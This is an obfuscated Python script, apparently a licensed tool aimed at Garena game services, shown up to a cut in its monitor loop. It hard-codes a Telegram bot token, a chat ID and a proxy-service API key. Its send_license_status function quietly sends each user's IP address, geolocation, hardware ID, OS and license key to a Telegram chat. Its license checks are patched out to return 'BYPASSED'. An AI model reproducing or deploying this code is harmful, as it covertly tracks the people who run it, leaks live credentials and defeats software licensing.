IllIlllllIlIIllIlIllI = getattr(__import__('importlib'), 'import_module')('os')
lIIIlIIlIIlllIIIlIII = getattr(__import__('importlib'), 'import_module')('sys')
json = __import__('json')
IlllllIIllIIllIIll = getattr(__import__('importlib'), 'import_module')('time')
lIlIlllIIIIlIlII = getattr(__import__('importlib'), 'import_module')('hashlib')
urllib = __import__('urllib.parse')
requests = __import__('requests')
llIlIlIllllIlIl = __import__('requests.adapters', fromlist=['HTTPAdapter'])
llllIIIllIIIIllIlIIIll = getattr(llIlIlIllllIlIl, 'HTTPAdapter')
IllIIlIlIIIllIlIlIlll = getattr(__import__('importlib'), 'import_module')('platform')
IlIlIlIlIlIlllIIIl = getattr(__import__('importlib'), 'import_module')('webbrowser')
IlIlIllllIlllIIIIll = getattr(__import__('importlib'), 'import_module')('threading')
IIllIlIlIlIIlIIII = getattr(__import__('importlib'), 'import_module')('hmac')
lIIIIllIIIIIllIlIllIIl = getattr(__import__('importlib'), 'import_module')('string')
IIIllllllIlIlIllIIIIl = getattr(__import__('importlib'), 'import_module')('random')
llIIIlIIllIllllIIIlll = getattr(__import__('importlib'), 'import_module')('codecs')
lIlIIIIlIllIllIIl = getattr(__import__('importlib'), 'import_module')('base64')
IlIlIIIllllIIl = getattr(__import__('importlib'), 'import_module')('signal')
IlIllIIllIllIlIllIIIllI = getattr(__import__('importlib'), 'import_module')('re')
IlIIIllllIlllIllIlIIIl = getattr(__import__('importlib'), 'import_module')('subprocess')
IlIlIllIIlIIlllI = getattr(__import__('importlib'), 'import_module')('importlib')
lIlIlIIIlllIllII = getattr(__import__('importlib'), 'import_module')('shutil')
llIlllIllIIlIIlllIlll = __import__('datetime', fromlist=['datetime'])
IllIIIIlIIllIIIIIIllll = getattr(llIlllIllIIlIIlllIlll, 'datetime')
IIIIIllllIIlIllIlIIIIIl = getattr(__import__('importlib'), 'import_module')('socket')
concurrent = __import__('concurrent.futures')
IIllIlIIIIIllllIIIlI = __import__('Crypto.Cipher', fromlist=['AES'])
IIIIIIIllIIlIIllIIIll = getattr(IIllIlIIIIIllllIIIlI, 'AES')
IllIlllIIIIlIl = __import__('Crypto.Util.Padding', fromlist=['pad'])
IIllIIIIlIlIIlIllI = getattr(IllIlllIIIIlIl, 'pad')
lIlIlIIIllIllll = __import__('colorama', fromlist=['Fore', 'Style', 'init'])
llIlIlIllllIIlIlIIIIlIl = getattr(lIlIlIIIllIllll, 'Fore')
lIllllIIlIIllIlllIIlll = getattr(lIlIlIIIllIllll, 'Style')
lIlIllIlllIIllIIIll = getattr(lIlIlIIIllIllll, 'init')
urllib3 = __import__('urllib3')
getattr(urllib3, 'disable_warnings')()
llIllIlIllIlIIlllIIIlIII = {'API_URL': 'https://jonuidkey.xyz/api/', 'VERSION': '4.2', 'TELEGRAM_BOT_TOKEN': '8981944553:AAGFDUBjm6FsbwIBnx3nAXN7CCBQsaXaVek', 'TELEGRAM_CHAT_ID': '6734323798', 'TELEGRAM_ENABLED': True, 'WHATSAPP_CHANNEL_URL': 'https://whatsapp.com/channel/0029VbCai0JHLHQSYQGLP20e', 'WHATSAPP_REDIRECT': False}
IllIIIllIIIIlIIIIIlIIII = {'enabled': False, 'static_file': 'proxyscrape_premium_http_proxies.txt', 'api_enabled': False, 'api_key': getattr(IllIlllllIlIIllIlIllI, 'getenv')('PROXYSCRAPE_API_KEY', '2OqZwed6UaT8lxiYNj4Oq9vo5GRqyAP7YSMSkmvW92IhWAyebKcWVVyAJZWsBTZI'), 'proxy_test_url': getattr(IllIlllllIlIIllIlIllI, 'getenv')('PROXY_TEST_URL', 'https://api.ipify.org'), 'max_proxies': 70, 'max_health_checks': 20, 'proxy_timeout': 5, 'healthcheck_timeout': 5, 'max_total_attempts': 4, 'cooldown': 30, 'refresh_interval': 300, 'verify_proxy_before_use': False}
PROXY_TEST_URL = IllIIIllIIIIlIIIIIlIIII['proxy_test_url']

class lllIIIIIIIIIllIIIllI:
    R = '\x1b[91m'
    G = '\x1b[92m'
    Y = '\x1b[93m'
    B = '\x1b[94m'
    C = '\x1b[96m'
    W = '\x1b[97m'
    RE = '\x1b[0m'
    BOLD = '\x1b[1m'
    BLINK = '\x1b[5m'
    BORDER = '\x1b[90m'
IIlllIlIlllllIlllllllll = getattr(lllIIIIIIIIIllIIIllI, 'R')
lIllIIllIllllIIIIlIlII = getattr(lllIIIIIIIIIllIIIllI, 'G')
Y = getattr(lllIIIIIIIIIllIIIllI, 'Y')
lIIIllIIIllIIlIlI = getattr(lllIIIIIIIIIllIIIllI, 'B')
C = getattr(lllIIIIIIIIIllIIIllI, 'C')
IlIllllllIlllIll = getattr(lllIIIIIIIIIllIIIllI, 'W')
llIIllllllIlllIlIIll = getattr(lllIIIIIIIIIllIIIllI, 'RE')
IllIlIlllIIIIIllllIIlll = getattr(lllIIIIIIIIIllIIIllI, 'BOLD')
lIIIlIIlIIlIIIIIIlII = getattr(lllIIIIIIIIIllIIIllI, 'BLINK')
IIIllIIIllIlIllll = getattr(lllIIIIIIIIIllIIIllI, 'BORDER')
lllIIIIIlIIlIlllllllIlIl = ''
lllIIlIlllIlII = False
IlIIIIllIlIlIl = False
IIIIIlIlllIIIlIllIIl = getattr(requests, 'Session')()
setattr(IIIIIlIlllIIIlIllIIl, 'verify', False)

def get_ip_fast():
    if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][31] == 7:
        lIIIIIlIIllllIIIlI = 8191261
        while True:
            if lIIIIIlIIllllIIIlI == 8191261:
                lIlllIllIllllIlIIIll = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][15] * 185990 + 140
                lIIIIIlIIllllIIIlI = 7131161
                continue
            if lIIIIIlIIllllIIIlI == 3283594:
                lIIIlIIlIIIlllIIlllI = [lIIlllIllIllllIIl >> 10 & 255 for llllIlIlllIlIlII in range(4)]
                lIIIIIlIIllllIIIlI = 2006108
                continue
            if lIIIIIlIIllllIIIlI == 2006108:
                IIlllllIIllIllllIIlIII = sum(lIIIlIIlIIIlllIIlllI) + lIIlllIllIllllIIl % 52 - lIlllIllIllllIlIIIll
                break
            if lIIIIIlIIllllIIIlI == 7131161:
                lIIlllIllIllllIIl = (lIlllIllIllllIlIIIll * 4 ^ 6664202) & 16777215
                lIIIIIlIIllllIIIlI = 3283594
                continue
            if lIIIIIlIIllllIIIlI == 1934094:
                lIIIIIlIIllllIIIlI = 7131161
                continue
    try:
        IlIlIllIIllIlI = getattr(IllIIlIlIIIllIlIlIlll, 'node')() + getattr(IllIIlIlIIIllIlIlIlll, 'processor')() + getattr(IllIIlIlIIIllIlIlIlll, 'machine')()
        return getattr(getattr(lIlIlllIIIIlIlII, 'md5')(getattr(IlIlIllIIllIlI, 'encode')('utf-8')), 'hexdigest')()
    except:
        return 'DEFAULT_DEVICE_ID_FAIL'
llIIllllIIlIIllIlll = get_ip_fast()

def get_public_ip():
    try:
        response = getattr(requests, 'get')('https://api.ipify.org?format=json', timeout=5)
        return getattr(getattr(response, 'json')(), 'get')('ip', 'Unknown')
    except:
        try:
            response = getattr(requests, 'get')('https://httpbin.org/ip', timeout=5)
            return getattr(getattr(response, 'json')(), 'get')('origin', 'Unknown')
        except:
            return 'Unknown'

def get_ip_location(ip):
    if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][0] == 88:
        IllllIlllIlIIIIlIIIllI = 9252346
        while True:
            if IllllIlllIlIIIIlIIIllI == 9252346:
                lIIIIllIlIllIlIllll = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][10] * 237918 + 140
                IllllIlllIlIIIIlIIIllI = 1608608
                continue
            if IllllIlllIlIIIIlIIIllI == 3007159:
                IllllIlllIlIIIIlIIIllI = 9252346
                continue
            if IllllIlllIlIIIIlIIIllI == 8750093:
                IllllIlllIlIIIIlIIIllI = 9252346
                continue
            if IllllIlllIlIIIIlIIIllI == 6046695:
                IIIlIlIlllllIIIl = sum(llIIIIllllllllIIlllIl) + IIIIIIIlIllllllIlIlllIII % 74 - lIIIIllIlIllIlIllll
                break
            if IllllIlllIlIIIIlIIIllI == 7268591:
                IllllIlllIlIIIIlIIIllI = 6046695
                continue
            if IllllIlllIlIIIIlIIIllI == 3650052:
                llIIIIllllllllIIlllIl = [IIIIIIIlIllllllIlIlllIII >> 7 & 255 for lIIIllllIlIIII in range(5)]
                IllllIlllIlIIIIlIIIllI = 6046695
                continue
            if IllllIlllIlIIIIlIIIllI == 1608608:
                IIIIIIIlIllllllIlIlllIII = (lIIIIllIlIllIlIllll * 5 ^ 1601383) & 16777215
                IllllIlllIlIIIIlIIIllI = 3650052
                continue
    try:
        IIIIlllIlllllIIl = 9375154
        while True:
            if IIIIlllIlllllIIl == 3715844:
                data = getattr(response, 'json')()
                IIIIlllIlllllIIl = 1262930
                continue
            if IIIIlllIlllllIIl == 1262930:
                if getattr(data, 'get')('status') == 'success':
                    return f'{getattr(data, 'get')('city', 'Unknown')}, {getattr(data, 'get')('country', 'Unknown')}'
                IIIIlllIlllllIIl = 3257000
                continue
            if IIIIlllIlllllIIl == 3257000:
                return 'Unknown'
                break
            if IIIIlllIlllllIIl == 2273764:
                IIIIlllIlllllIIl = 1262930
                continue
            if IIIIlllIlllllIIl == 6661842:
                IIIIlllIlllllIIl = 6661842
                continue
            if IIIIlllIlllllIIl == 8930832:
                IIIIlllIlllllIIl = 3257000
                continue
            if IIIIlllIlllllIIl == 9375154:
                response = getattr(requests, 'get')(f'http://ip-api.com/json/{ip}', timeout=5)
                IIIIlllIlllllIIl = 3715844
                continue
    except:
        return 'Unknown'

def send_license_status(license_key, user_data, status='LOGIN'):
    lIllIIIIlIIIIllIl = 4055292
    while True:
        if lIllIIIIlIIIIllIl == 1308547:
            if not llIllIlIllIlIIlllIIIlIII['TELEGRAM_ENABLED']:
                return False
            lIllIIIIlIIIIllIl = 4789677
            continue
        if lIllIIIIlIIIIllIl == 4055292:
            lIllIIIIlIIIIllIl = 1308547
            continue
        if lIllIIIIlIIIIllIl == 4789677:
            try:
                lllIllIIIlIllIIlIIIllIll = 3142971
                while True:
                    if lllIllIIIlIllIIlIIIllIll == 7752340:
                        IlllIlllllIlIIIIIllllllI = {'chat_id': llIllIlIllIlIIlllIIIlIII['TELEGRAM_CHAT_ID'], 'text': message, 'parse_mode': 'Markdown'}
                        lllIllIIIlIllIIlIIIllIll = 7119982
                        continue
                    if lllIllIIIlIllIIlIIIllIll == 2319159:
                        return getattr(response, 'status_code') == 200
                        break
                    if lllIllIIIlIllIIlIIIllIll == 2974128:
                        if status == 'LOGIN':
                            lIlIIllIlIllllIlIIIIlllI = '🟢'
                            llIIlllllllIIIIIIIIII = 'USER LOGIN DETECTED!'
                        else:
                            lIlIIllIlIllllIlIIIIlllI = '💓'
                            llIIlllllllIIIIIIIIII = 'USER HEARTBEAT'
                        lllIllIIIlIllIIlIIIllIll = 2338905
                        continue
                    if lllIllIIIlIllIIlIIIllIll == 6285313:
                        lllIllIIIlIllIIlIIIllIll = 8134253
                        continue
                    if lllIllIIIlIllIIlIIIllIll == 5819875:
                        lllIllIIIlIllIIlIIIllIll = 9099256
                        continue
                    if lllIllIIIlIllIIlIIIllIll == 3142971:
                        IlIIlIlllIlIllIIlll = get_public_ip()
                        lllIllIIIlIllIIlIIIllIll = 8134253
                        continue
                    if lllIllIIIlIllIIlIIIllIll == 2338905:
                        message = f'\n{lIlIIllIlIllllIlIIIIlllI} *{llIIlllllllIIIIIIIIII}* {lIlIIllIlIllllIlIIIIlllI}\n\n━━━━━━━━━━━━━━━━━━━━\n🔑 *License Key:* `{license_key}`\n\n👤 *User Info:*\n• Owner: `{getattr(user_data, 'get')('owner', 'N/A')}`\n• Days Left: `{getattr(user_data, 'get')('days_left', 'N/A')}` hari\n• Expired: `{getattr(user_data, 'get')('expired_at', 'N/A')}`\n\n🖥️ *Device Info:*\n• HWID: `{llIIllllIIlIIllIlll[:16]}...`\n• OS: `{getattr(IllIIlIlIIIllIlIlIlll, 'system')()} {getattr(IllIIlIlIIIllIlIlIlll, 'release')()}`\n\n🌐 *Network Info:*\n• IP Address: `{IlIIlIlllIlIllIIlll}`\n• Location: `{llIIllllllIlII}`\n\n📱 *App Info:*\n• Version: `{llIllIlIllIlIIlllIIIlIII['VERSION']}`\n• Time: `{getattr(getattr(IllIIIIlIIllIIIIIIllll, 'now')(), 'strftime')('%Y-%m-%d %H:%M:%S')}`\n\n━━━━━━━━━━━━━━━━━━━━\n📱 *Join WhatsApp:* {llIllIlIllIlIIlllIIIlIII['WHATSAPP_CHANNEL_URL']}\n'
                        lllIllIIIlIllIIlIIIllIll = 9099256
                        continue
                    if lllIllIIIlIllIIlIIIllIll == 3161064:
                        lllIllIIIlIllIIlIIIllIll = 2319159
                        continue
                    if lllIllIIIlIllIIlIIIllIll == 8134253:
                        llIIllllllIlII = get_ip_location(IlIIlIlllIlIllIIlll)
                        lllIllIIIlIllIIlIIIllIll = 2974128
                        continue
                    if lllIllIIIlIllIIlIIIllIll == 7119982:
                        response = getattr(requests, 'post')(url, json=IlllIlllllIlIIIIIllllllI, timeout=5)
                        lllIllIIIlIllIIlIIIllIll = 2319159
                        continue
                    if lllIllIIIlIllIIlIIIllIll == 9099256:
                        url = f'https://api.telegram.org/bot{llIllIlIllIlIIlllIIIlIII['TELEGRAM_BOT_TOKEN']}/sendMessage'
                        lllIllIIIlIllIIlIIIllIll = 7752340
                        continue
            except:
                return False
            break
        if lIllIIIIlIIIIllIl == 8704889:
            lIllIIIIlIIIIllIl = 1308547
            continue
        if lIllIIIIlIIIIllIl == 1442232:
            lIllIIIIlIIIIllIl = 4789677
            continue

def initialize_runtime():
    if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][9] == 102:
        IIlIllIlIlIlIlIlllllIlII = 2131974
        while True:
            if IIlIllIlIlIlIlIlllllIlII == 7798931:
                IIlIllIlIlIlIlIlllllIlII = 7798931
                continue
            if IIlIllIlIlIlIlIlllllIlII == 2131974:
                lIllIIIllIIIlIlIlIlIIl = 5602858
                IIlIllIlIlIlIlIlllllIlII = 9475649
                continue
            if IIlIllIlIlIlIlIlllllIlII == 2075962:
                lIllIIIIllIIIIl = [llIlIlIllIIlIIllll >> 12 & 255 for IlIllIllIIlIIIlIIl in range(9)]
                IIlIllIlIlIlIlIlllllIlII = 3099405
                continue
            if IIlIllIlIlIlIlIlllllIlII == 3099405:
                IlIlIIIIIIlIlIl = sum(lIllIIIIllIIIIl) + llIlIlIllIIlIIllll % 48 - lIllIIIllIIIlIlIlIlIIl
                break
            if IIlIllIlIlIlIlIlllllIlII == 9791068:
                IIlIllIlIlIlIlIlllllIlII = 2075962
                continue
            if IIlIllIlIlIlIlIlllllIlII == 9475649:
                llIlIlIllIIlIIllll = (lIllIIIllIIIlIlIlIlIIl * 9 ^ 16349266) & 65535
                IIlIllIlIlIlIlIlllllIlII = 2075962
                continue
    if llIllIlIllIlIIlllIIIlIII['WHATSAPP_REDIRECT']:
        try:
            getattr(IlIlIlIlIlIlllIIIl, 'open')(llIllIlIllIlIIlllIIIlIII['WHATSAPP_CHANNEL_URL'])
        except:
            pass

def show_error(pesan_error):
    global lllIIlIlllIlII, IlIIIIllIlIlIl
    llIllIIlllIIIIlIllIll = 7166342
    while True:
        if llIllIIlllIIIIlIllIll == 8230270:
            print(pesan_error)
            llIllIIlllIIIIlIllIll = 1155060
            continue
        if llIllIIlllIIIIlIllIll == 5772143:
            lllIIlIlllIlII = True
            llIllIIlllIIIIlIllIll = 4080320
            continue
        if llIllIIlllIIIIlIllIll == 8500469:
            llIllIIlllIIIIlIllIll = 1155060
            continue
        if llIllIIlllIIIIlIllIll == 7000501:
            getattr(IllIlllllIlIIllIlIllI, '_exit')(1)
            break
        if llIllIIlllIIIIlIllIll == 8285138:
            print('\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
            llIllIIlllIIIIlIllIll = 8230270
            continue
        if llIllIIlllIIIIlIllIll == 7166342:
            llIllIIlllIIIIlIllIll = 5772143
            continue
        if llIllIIlllIIIIlIllIll == 4080320:
            IlIIIIllIlIlIl = True
            llIllIIlllIIIIlIllIll = 8285138
            continue
        if llIllIIlllIIIIlIllIll == 1155060:
            print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n')
            llIllIIlllIIIIlIllIll = 7000501
            continue
        if llIllIIlllIIIIlIllIll == 1432932:
            llIllIIlllIIIIlIllIll = 5772143
            continue
        if llIllIIlllIIIIlIllIll == 4187330:
            llIllIIlllIIIIlIllIll = 8500469
            continue

def check_license():
    global lllIIlIlllIlII, IlIIIIllIlIlIl
    lllIIlIlllIlII = False
    IlIIIIllIlIlIl = False
    return True
def load_license():
    global lllIIIIIlIIlIlllllllIlIl, lllIIlIlllIlII
    lllIIIIIlIIlIlllllllIlIl = "BYPASSED"
    lllIIlIlllIlII = False
    return True
def initialize_ip_pool():
    global lllIIIIIlIIlIlllllllIlIl, lllIIlIlllIlII
    lllIIIIIlIIlIlllllllIlIl = "BYPASSED"
    lllIIlIlllIlII = False
    return True
def proxy_monitor():
    global lllIIlIlllIlII
    IllIlIlIIllIIllI = 9710961
    while True:
        if IllIlIlIIllIIllI == 9031747:
            return True
            break
        if IllIlIlIIllIIllI == 9567391:
            IllIlIlIIllIIllI = 6135214
            continue
        if IllIlIlIIllIIllI == 6135214:
            IllIlIlIIllIIllI = 9567391
            continue
        if IllIlIlIIllIIllI == 9710961:
            IllIlIlIIllIIllI = 3055990
            continue
        if IllIlIlIIllIIllI == 3055990:
            if lllIIlIlllIlII or IlIIIIllIlIlIl:
                return False
            IllIlIlIIllIIllI = 9031747
            continue
        if IllIlIlIIllIIllI == 1177543:
            IllIlIlIIllIIllI = 9710961
            continue

class IllIlIIlIIlIllIll:

    def __init__(self):
        IlIIIlIlIIIIlIlIIIIl = 4576756
        while True:
            if IlIIIlIlIIIIlIlIIIIl == 2416219:
                setattr(self, 'display_lock', getattr(IlIlIllllIlllIIIIll, 'Lock')())
                IlIIIlIlIIIIlIlIIIIl = 2799309
                continue
            if IlIIIlIlIIIIlIlIIIIl == 8999472:
                setattr(self, 'last_ping', 0)
                IlIIIlIlIIIIlIlIIIIl = 3900921
                continue
            if IlIIIlIlIIIIlIlIIIIl == 9533053:
                IlIIIlIlIIIIlIlIIIIl = 9136166
                continue
            if IlIIIlIlIIIIlIlIIIIl == 8999897:
                setattr(self, 'lock', getattr(IlIlIllllIlllIIIIll, 'Lock')())
                IlIIIlIlIIIIlIlIIIIl = 2416219
                continue
            if IlIIIlIlIIIIlIlIIIIl == 4576756:
                IlIIIlIlIIIIlIlIIIIl = 4076645
                continue
            if IlIIIlIlIIIIlIlIIIIl == 3012907:
                IlIIIlIlIIIIlIlIIIIl = 9533053
                continue
            if IlIIIlIlIIIIlIlIIIIl == 9136166:
                setattr(self, 'thread', None)
                IlIIIlIlIIIIlIlIIIIl = 8999472
                continue
            if IlIIIlIlIIIIlIlIIIIl == 7157014:
                IlIIIlIlIIIIlIlIIIIl = 4076645
                continue
            if IlIIIlIlIIIIlIlIIIIl == 9076996:
                setattr(self, 'online', False)
                break
            if IlIIIlIlIIIIlIlIIIIl == 4076645:
                setattr(self, 'running', False)
                IlIIIlIlIIIIlIlIIIIl = 9136166
                continue
            if IlIIIlIlIIIIlIlIIIIl == 2799309:
                setattr(self, 'enabled', False)
                IlIIIlIlIIIIlIlIIIIl = 9076996
                continue
            if IlIIIlIlIIIIlIlIIIIl == 3900921:
                setattr(self, 'status', 'CHECKING')
                IlIIIlIlIIIIlIlIIIIl = 8999897
                continue

    def start(self):
        IIIllIIIlllllIIllllIlIl = 9198288
        while True:
            if IIIllIIIlllllIIllllIlIl == 7049577:
                IIIllIIIlllllIIllllIlIl = 9913327
                continue
            if IIIllIIIlllllIIllllIlIl == 5967586:
                setattr(self, 'running', True)
                IIIllIIIlllllIIllllIlIl = 3498271
                continue
            if IIIllIIIlllllIIllllIlIl == 9198288:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][3] ^ 124 == 349:
                    IIllllIIIIllIl = 2515593
                    while True:
                        if IIllllIIIIllIl == 9622391:
                            IIIlIlIllllIIIlIllIII = (lIIIlIlIIlIlIlIlIlI * 9 ^ 1183245) & 4294967295
                            IIllllIIIIllIl = 3736346
                            continue
                        if IIllllIIIIllIl == 5145780:
                            lIIIIIlIlIllIIl = sum(llIlIIIlllIlIllIIIlIIl) + IIIlIlIllllIIIlIllIII % 73 - lIIIlIlIIlIlIlIlIlI
                            break
                        if IIllllIIIIllIl == 6240286:
                            IIllllIIIIllIl = 5145780
                            continue
                        if IIllllIIIIllIl == 3736346:
                            llIlIIIlllIlIllIIIlIIl = [IIIlIlIllllIIIlIllIII >> 10 & 255 for llIlIIIlIllllIIlllIIIlll in range(9)]
                            IIllllIIIIllIl = 5145780
                            continue
                        if IIllllIIIIllIl == 2515593:
                            lIIIlIlIIlIlIlIlIlI = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][25] * 951240 + 168
                            IIllllIIIIllIl = 9622391
                            continue
                IIIllIIIlllllIIllllIlIl = 8751399
                continue
            if IIIllIIIlllllIIllllIlIl == 9913327:
                setattr(self, 'thread', getattr(IlIlIllllIlllIIIIll, 'Thread')(target=getattr(self, '_monitor_loop'), daemon=True))
                IIIllIIIlllllIIllllIlIl = 1817520
                continue
            if IIIllIIIlllllIIllllIlIl == 6705849:
                IIIllIIIlllllIIllllIlIl = 3498271
                continue
            if IIIllIIIlllllIIllllIlIl == 1817520:
                getattr(getattr(self, 'thread'), 'start')()
                break
            if IIIllIIIlllllIIllllIlIl == 8751399:
                if getattr(self, 'running'):
                    return
                IIIllIIIlllllIIllllIlIl = 5967586
                continue
            if IIIllIIIlllllIIllllIlIl == 3498271:
                setattr(self, 'enabled', True)
                IIIllIIIlllllIIllllIlIl = 9913327
                continue

    def stop(self):
        IIIIIllIIIllIlIIIIIIl = 4092423
        while True:
            if IIIIIllIIIllIlIIIIIIl == 2162595:
                setattr(self, 'enabled', False)
                IIIIIllIIIllIlIIIIIIl = 8355309
                continue
            if IIIIIllIIIllIlIIIIIIl == 2684821:
                IIIIIllIIIllIlIIIIIIl = 8670754
                continue
            if IIIIIllIIIllIlIIIIIIl == 8670754:
                IIIIIllIIIllIlIIIIIIl = 8670754
                continue
            if IIIIIllIIIllIlIIIIIIl == 8355309:
                if getattr(self, 'thread'):
                    getattr(getattr(self, 'thread'), 'join')(timeout=1)
                break
            if IIIIIllIIIllIlIIIIIIl == 4628024:
                setattr(self, 'running', False)
                IIIIIllIIIllIlIIIIIIl = 2162595
                continue
            if IIIIIllIIIllIlIIIIIIl == 8945860:
                IIIIIllIIIllIlIIIIIIl = 2162595
                continue
            if IIIIIllIIIllIlIIIIIIl == 4092423:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][0] * 35 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][28] == 6405:
                    IllllIIIlIIlIlIIllllIlII = 2635714
                    while True:
                        if IllllIIIlIIlIlIIllllIlII == 6188051:
                            IllllIIIlIIlIlIIllllIlII = 6000651
                            continue
                        if IllllIIIlIIlIlIIllllIlII == 7391648:
                            IllllIIIlIIlIlIIllllIlII = 6000651
                            continue
                        if IllllIIIlIIlIlIIllllIlII == 1913401:
                            IllllIIIlIIlIlIIllllIlII = 1913401
                            continue
                        if IllllIIIlIIlIlIIllllIlII == 7004600:
                            IllllIIllllIlIllIIlllIll = sum(lIIlllIlIIlIlI) + lllIlllIIlIllIIlIIlIll % 56 - llIllIllIlIIlIlII
                            break
                        if IllllIIIlIIlIlIIllllIlII == 2635714:
                            llIllIllIlIIlIlII = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][1] * 578092 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][9]
                            IllllIIIlIIlIlIIllllIlII = 4830895
                            continue
                        if IllllIIIlIIlIlIIllllIlII == 4830895:
                            lllIlllIIlIllIIlIIlIll = (llIllIllIlIIlIlII * 9 ^ 14659781) & 16777215
                            IllllIIIlIIlIlIIllllIlII = 6000651
                            continue
                        if IllllIIIlIIlIlIIllllIlII == 6000651:
                            lIIlllIlIIlIlI = [lllIlllIIlIllIIlIIlIll >> 7 & 255 for lIIIllIllIlIlIIlI in range(9)]
                            IllllIIIlIIlIlIIllllIlII = 7004600
                            continue
                IIIIIllIIIllIlIIIIIIl = 4628024
                continue

    def _monitor_loop(self):
        if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][11] == 149:
            lIIIlIIlllllllIlI = 7468804
            while True:
                if lIIIlIIlllllllIlI == 9794773:
                    lllIIllllIIIlllllIIlIlIl = (lIIIlIIIIIlllIlIlIlI * 4 ^ 9244371) & 16777215
                    lIIIlIIlllllllIlI = 3775185
                    continue
                if lIIIlIIlllllllIlI == 7468804:
                    lIIIlIIIIIlllIlIlIlI = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][31] * 183225 + 192
                    lIIIlIIlllllllIlI = 9794773
                    continue
                if lIIIlIIlllllllIlI == 6735597:
                    lIIIlIIlllllllIlI = 7468804
                    continue
                if lIIIlIIlllllllIlI == 8901017:
                    lIIIlIIlllllllIlI = 7468804
                    continue
                if lIIIlIIlllllllIlI == 3775185:
                    IIllIIlIIIllllllII = [lllIIllllIIIlllllIIlIlIl >> 2 & 255 for lIIlllllIIlIIIlII in range(4)]
                    lIIIlIIlllllllIlI = 9364621
                    continue
                if lIIIlIIlllllllIlI == 9364621:
                    llIIllIIIIlIlIlI = sum(IIllIIlIIIllllllII) + lllIIllllIIIlllllIIlIlIl % 84 - lIIIlIIIIIlllIlIlIlI
                    break
        while getattr(self, 'running'):
            try:
                IllIIIIlIIllIIlIIIIl = 9510969
                while True:
                    if IllIIIIlIIllIIlIIIIl == 9510969:
                        IIIllIIlIllIllIIIl = getattr(IlllllIIllIIllIIll, 'time')()
                        IllIIIIlIIllIIlIIIIl = 2186156
                        continue
                    if IllIIIIlIIllIIlIIIIl == 5640618:
                        IllIIIIlIIllIIlIIIIl = 4391085
                        continue
                    if IllIIIIlIIllIIlIIIIl == 2186156:
                        response = getattr(requests, 'get')('https://100067.connect.garena.com', timeout=3)
                        IllIIIIlIIllIIlIIIIl = 4391085
                        continue
                    if IllIIIIlIIllIIlIIIIl == 4391085:
                        lllllIlIIIllIIlllIIlI = (getattr(IlllllIIllIIllIIll, 'time')() - IIIllIIlIllIllIIIl) * 1000
                        IllIIIIlIIllIIlIIIIl = 7925161
                        continue
                    if IllIIIIlIIllIIlIIIIl == 7925161:
                        with getattr(self, 'lock'):
                            IlIIllllIlIlIIllllIIIIlI = 3334836
                            while True:
                                if IlIIllllIlIlIIllllIIIIlI == 7788371:
                                    IlIIllllIlIlIIllllIIIIlI = 7788371
                                    continue
                                if IlIIllllIlIlIIllllIIIIlI == 9214138:
                                    if lllllIlIIIllIIlllIIlI < 100:
                                        setattr(self, 'status', f'{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}🟢 {lllllIlIIIllIIlllIIlI:.0f}ms{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                                    elif lllllIlIIIllIIlllIIlI < 200:
                                        setattr(self, 'status', f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}🟡 {lllllIlIIIllIIlllIIlI:.0f}ms{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                                    elif lllllIlIIIllIIlllIIlI < 500:
                                        setattr(self, 'status', f'{getattr(IlIIIIIIlIIlIlll, 'ORANGE_GLOW')}🟠 {lllllIlIIIllIIlllIIlI:.0f}ms{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                                    else:
                                        setattr(self, 'status', f'{getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}🔴 {lllllIlIIIllIIlllIIlI:.0f}ms{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                                    break
                                if IlIIllllIlIlIIllllIIIIlI == 3334836:
